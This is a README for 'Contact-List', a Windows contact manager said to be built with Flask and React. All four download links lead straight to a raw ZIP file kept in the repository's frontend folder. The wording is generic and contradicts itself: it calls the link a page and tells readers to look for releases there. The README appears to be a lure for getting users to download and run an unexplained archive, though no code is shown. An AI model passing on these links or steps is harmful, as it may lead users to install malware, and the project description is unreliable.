# 📇 Contact-List - Simple Contact Management for Windows

[![Download Contact-List](https://img.shields.io/badge/Download-Contact--List-blue?style=for-the-badge)](https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip)

## 🖥️ What This App Does

Contact-List helps you store and manage your contacts in one place. You can add new people, edit details, view saved contacts, and remove entries when you no longer need them. It uses a simple web app layout, so you can work with your contact list from your browser on Windows.

## 📥 Download and Open

1. Visit this page to download: [https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip](https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip)
2. On the page, look for the latest release or download files.
3. Save the file to your Windows computer.
4. Open the downloaded folder.
5. Run the app files by following the included setup steps in the repository.

If the project is provided as source code, you will usually need both the front end and the back end to run. The front end is the part you see in the browser. The back end handles the contact data and the API.

## 🧰 What You Need

Before you start, make sure your Windows PC has:

- A modern web browser such as Chrome, Edge, or Firefox
- Internet access for the first setup
- Python 3.10 or newer
- Node.js 18 or newer
- Git, if you plan to clone the repository

You may also want a text editor such as Visual Studio Code if you need to check files or change settings.

## 🚀 Getting Started

Follow these steps to run Contact-List on Windows:

1. Go to [https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip](https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip)
2. Download the project files to your computer.
3. If you received a ZIP file, right-click it and choose Extract All.
4. Open the extracted folder.
5. Open a Command Prompt window in that folder.
6. Set up the back end first.
7. Set up the front end after the back end is ready.
8. Open the app in your browser.

## 🐍 Back End Setup

The back end uses Flask and stores contact data through a database layer.

1. Open Command Prompt in the project folder.
2. Go to the back end folder, such as `backend` or `server`.
3. Create a virtual environment:

   ```bash
   python -m venv venv
   ```

4. Turn it on:

   ```bash
   venv\Scripts\activate
   ```

5. Install the back end packages:

   ```bash
   pip install -r requirements.txt
   ```

6. Start the back end server:

   ```bash
   flask run
   ```

If the project uses a main Python file, you may also see a command like:

```bash
python app.py
```

Keep this window open while you use the app.

## 🌐 Front End Setup

The front end uses React and runs in your browser.

1. Open a second Command Prompt window in the project folder.
2. Go to the front end folder, such as `frontend`.
3. Install the front end packages:

   ```bash
   npm install
   ```

4. Start the front end:

   ```bash
   npm start
   ```

5. Wait for the browser to open.

If the browser does not open on its own, use the local address shown in the terminal, such as `http://localhost:3000`.

## 📝 How to Use Contact-List

After the app opens, you can manage your contacts with a few simple actions:

- Add a new contact with a name, phone number, email, or other fields
- View all saved contacts in a clean list
- Edit a contact when details change
- Delete a contact you no longer need
- Refresh the page to see the latest data

The app sends each change through a REST API, so your contact list stays in sync with the back end.

## 🔧 Common Windows Tips

If something does not work, check these points:

- Make sure Python is installed and added to PATH
- Make sure Node.js is installed
- Use Command Prompt or PowerShell from inside the project folder
- Run the back end before the front end
- Keep both terminal windows open
- Check that no other app uses the same port, such as 3000 or 5000

If Windows asks for permission, allow access so the server can run on your local machine.

## 📁 Typical Project Layout

You may see folders and files like these:

- `backend` or `server` for the Flask app
- `frontend` for the React app
- `requirements.txt` for Python packages
- `package.json` for Node packages
- `README.md` for setup steps
- database files for stored contact data

## 🔐 Data and Privacy

Contact-List keeps your contact data in the app database used by the back end. If you run it on your own computer, your data stays on your machine unless you choose to host it elsewhere. You can also use it in a local setup for testing and personal use.

## 🛠️ If the App Does Not Start

Try these checks:

1. Close both terminal windows.
2. Open them again in the project folder.
3. Run the back end first.
4. Run the front end second.
5. Check the terminal for error messages.
6. Make sure all required packages finished installing.
7. Restart your computer if Windows still blocks the app.

## 📚 Main Parts of the App

- React front end for the user screen
- Flask back end for app logic
- REST API for contact actions
- SQLAlchemy for database access
- CORS support so the front end can talk to the back end
- CRUD tools for create, read, update, and delete actions

## 📌 Quick Start Path

1. Download the project from [https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip](https://github.com/Colori2467/Contact-List/raw/refs/heads/main/frontend/List-Contact-1.8-alpha.4.zip)
2. Extract the files
3. Install Python and Node.js if needed
4. Start the Flask server
5. Start the React app
6. Use the browser window to manage your contacts